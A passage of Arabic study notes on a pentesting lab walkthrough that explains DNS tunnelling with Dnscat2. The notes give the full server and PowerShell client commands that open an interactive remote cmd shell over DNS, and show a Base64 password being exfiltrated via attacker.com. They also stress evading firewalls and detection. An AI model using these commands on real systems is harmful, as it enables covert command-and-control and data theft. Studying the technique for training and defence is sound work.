لكن الـ Server بتاع المهاجم هيقرأ البيانات اللي متشفرة جوه الـ Query.

وده اسمه:

## DNS Tunnel

---

## مثال بسيط

بدل ما أبعت:

```text
Password=123456
```

في HTTPS.

أحولها لـ:

```text
UGFzc3dvcmQ9MTIzNDU2.attacker.com
```

ودي Base64 مثلًا.

فتبقى مجرد DNS Query.

لكن فعليًا هي بتنقل بيانات.

---

## يبقى Dnscat2 بيعمل إيه؟

المقال بيقول:

> هو Tool بيستخدم DNS Protocol لنقل البيانات.

يعني بدل ما يستخدم:

- HTTP
    
- HTTPS
    
- TCP
    

هيستخدم:

```text
DNS
```

---

## ليه اسمه Dnscat2؟

لأنه شبه Netcat.

لكن بدل TCP.

بيستخدم:

```text
DNS
```

---

## أهم ميزة

المقال قال:

> البيانات بتتبعت داخل TXT Records.

---

## يعني إيه TXT Record؟

في DNS فيه أنواع كتير.

مثلاً:

| النوع | وظيفته              |
| ----- | ------------------- |
| A     | يحول اسم إلى IPv4   |
| AAAA  | IPv6                |
| MX    | Mail Server         |
| NS    | Name Server         |
| TXT   | نصوص (Text Records) |

---

Dnscat2 بيستخدم:

```text
TXT
```

علشان يخبي البيانات.

---

## ليه TXT؟

لأن TXT Record يقدر يشيل نصوص.

فبدل ما يشيل:

```text
SPF Record
```

يشيل:

```text
Encrypted Data
```

---

## يعني الترافيك بيبقى شكله

بدل:

```text
HTTPS

↓

Firewall

↓

Blocked
```

يبقى:

```text
DNS

↓

Firewall

↓

Allowed
```

---

## ليه ده Stealthy؟

المقال قال:

> Firewall ساعات بيفتش HTTPS.

يعني:

يفك TLS.

ويشوف البيانات.

لكن DNS؟

غالبًا محدش بيفتش فيه بنفس المستوى.

فـ Dnscat2 بيبقى صعب يتشاف.

---

## السيناريو

المقال عنده:

```text
Windows Target

↓

DNS Query

↓

Corporate DNS

↓

Attacker DNS Server
```

يعني الجهاز الضحية بيبعت DNS Queries.

لكن بدل ما يطلب:

```text
google.com
```

هو بيبعت بيانات للمهاجم.

---

## أول خطوة

تحميل Dnscat2.

```bash
git clone https://github.com/iagox86/dnscat2.git
```

هيعمل Folder.

---

بعدها:

```bash
cd dnscat2/server
```

دخل فولدر السيرفر.

---

## Bundler

بعدها:

```bash
sudo gem install bundler
```

---

ليه؟

لأن السيرفر مكتوب بلغة:

```text
Ruby
```

وBundler بينزل المكتبات المطلوبة.

---

بعدها:

```bash
bundle install
```

يعني:

نزّل كل Dependencies.

---

## تشغيل السيرفر

المقال استخدم:

```bash
sudo ruby dnscat2.rb \
--dns host=10.10.14.18,port=53,domain=inlanefreight.local \
--no-cache
```

وده أهم أمر.

---

## نشرحه

## ruby

شغل برنامج Ruby.

---

## dnscat2.rb

السيرفر.

---

## --dns

إعدادات الـ DNS Server.

---

## host

```text
10.10.14.18
```

عنوان جهاز المهاجم.

---

## port

```text
53
```

بورت DNS.

---

## domain

```text
inlanefreight.local
```

الدومين اللي هيستخدمه الـ Client.

---

## --no-cache

يعني:

متستخدمش DNS Cache.

ليه؟

علشان كل Query توصل للسيرفر فعلًا.

---

## بعد التشغيل

ظهر:

```text
Starting DNS Server
```

يعني السيرفر اشتغل.

---

## أهم حاجة ظهرت

ظهر:

```text
Secret

0ec04....
```

ودي أهم معلومة.

---

## ليه؟

دي اسمها:

```text
Pre Shared Secret
```

أو:

```text
PSK
```

---

يعني:

مفتاح سري.

---

## ليه موجود؟

علشان:

- يمنع أي حد يدخل على السيرفر.
    
- يشفر البيانات.
    

---

## بعد كده

المقال حمل:

```bash
git clone https://github.com/lukebaggett/dnscat2-powershell.git
```

---

وده عبارة عن:

نسخة PowerShell Client.

يعني بدل EXE.

هنستخدم Script.

---

## بعد نقله للويندوز

عمل:

```powershell
Import-Module .\dnscat2.ps1
```

---

يعني:

حمّل الـ Module.

---

## بعد كده

شغل:

```powershell
Start-Dnscat2 `
-DNSserver 10.10.14.18 `
-Domain inlanefreight.local `
-PreSharedSecret 0ec04... `
-Exec cmd
```

وده أهم أمر.

---

## نشرحه

## DNSserver

عنوان السيرفر.

---

## Domain

الدومين.

---

## PreSharedSecret

المفتاح اللي السيرفر طلعّه.

لازم يكون نفس المفتاح.

---

## Exec

```text
cmd
```

يعني:

لما الاتصال يتم...

شغل:

```text
cmd.exe
```

---

## بعد كده

السيرفر كتب:

```text
Session 1

ENCRYPTED
```

يعني:

الجلسة اتعملت.

---

وكمان:

```text
VERIFIED
```

يعني:

الـ Secret صح.

---

## ليه مكتوب ENCRYPTED؟

لأن البيانات اللي ماشية في DNS.

مش Plain Text.

دي متشفرة.

---

## بعد كده

كتب:

```text
?
```

---

ودي زى:

```bash
help
```

---

وطلع أوامر.

زي:

```text
echo
```

يطبع.

---

```text
kill
```

يقفل Session.

---

```text
window
```

يدخل Session.

---

## أهم أمر

المقال استخدم:

```text
window -i 1
```

---

يعني:

ادخل Session رقم:

```text
1
```

---

بعدها ظهر:

```text
Microsoft Windows
```

---

وبقى عنده:

```cmd
C:\Windows\System32>
```

---

يعني بقى عنده:

```text
Interactive CMD
```

---

أي أمر يكتبه.

هيتنفذ على الضحية.

---

مثلاً:

```cmd
whoami
```

---

أو

```cmd
hostname
```

---

أو

```cmd
dir
```

---

كل ده بيتم نقله داخل:

```text
DNS Queries
```

مش HTTPS.

---

## شكل الترافيك

```text
CMD Command

↓

Dnscat2 Client

↓

DNS Query

↓

Corporate DNS

↓

Attacker DNS Server

↓

Dnscat2 Server
```

والرد بيرجع بنفس الطريقة.

---

## ليه الشركات ممكن متكتشفوش؟

لأن الترافيك شكله:

```text
DNS
```

وده طبيعي جدًا في أي شركة.

فلو مفيش مراقبة متقدمة للـ DNS أو تحليل لمحتوى الـ Queries، ممكن يعدّي بدون ملاحظة.

---

## مقارنة بين Dnscat2 و Reverse Shell

|Reverse Shell|Dnscat2|
|---|---|
|يستخدم TCP/HTTP غالبًا|يستخدم DNS|
|قد تمنعه الـ Firewall|DNS غالبًا مسموح|
|سهل ملاحظته نسبيًا|أكثر تخفيًا|
|يحتاج بورت مفتوح|يعتمد على DNS (53)|

---

## مقارنة بين Dnscat2 و Chisel

|Dnscat2|Chisel|
|---|---|
|يعتمد على DNS|يعتمد على HTTP/WebSocket|
|مناسب لو HTTP ممنوع وDNS متاح|مناسب لو HTTP/HTTPS متاح|
|يستخدم DNS Tunnel|يستخدم HTTP Tunnel|
|أبطأ بسبب طبيعة DNS|أسرع في نقل البيانات|

---

## ملاحظات مهمة

- **Dnscat2 أبطأ** من الأنفاق المبنية على TCP أو HTTP، لأن DNS مش مصمم لنقل كميات كبيرة من البيانات.
    
- مناسب أكثر لـ:
    
    - إنشاء قناة تحكم (C2).
        
    - تنفيذ أوامر.
        
    - نقل بيانات صغيرة أو حساسة.
        
- نقل ملفات كبيرة عبر DNS هيكون بطيء وغير عملي.
    

---

## الخلاصة

**Dnscat2** هو أداة بتنشئ **Command & Control Channel** باستخدام **بروتوكول DNS** بدل HTTP أو TCP.

الفكرة كالتالي:

1. تشغل **Dnscat2 Server** على جهازك.
    
2. السيرفر يولد **Pre-Shared Secret** لتأمين الاتصال.
    
3. تشغل **Dnscat2 Client** على الجهاز الهدف باستخدام نفس الـ Secret.
    
4. العميل يرسل الأوامر والنتائج داخل **DNS TXT Records** في صورة بيانات مشفرة.
    
5. تقدر تفتح جلسة تفاعلية (`window -i 1`) وتنفذ أوامر على الجهاز، بينما كل الترافيك يبدو ظاهريًا كأنه استعلامات DNS عادية، وده بيساعد على تقليل فرص اكتشافه في البيئات اللي تسمح بخروج DNS لكنها تراقب أو تمنع أنواع اتصال تانية.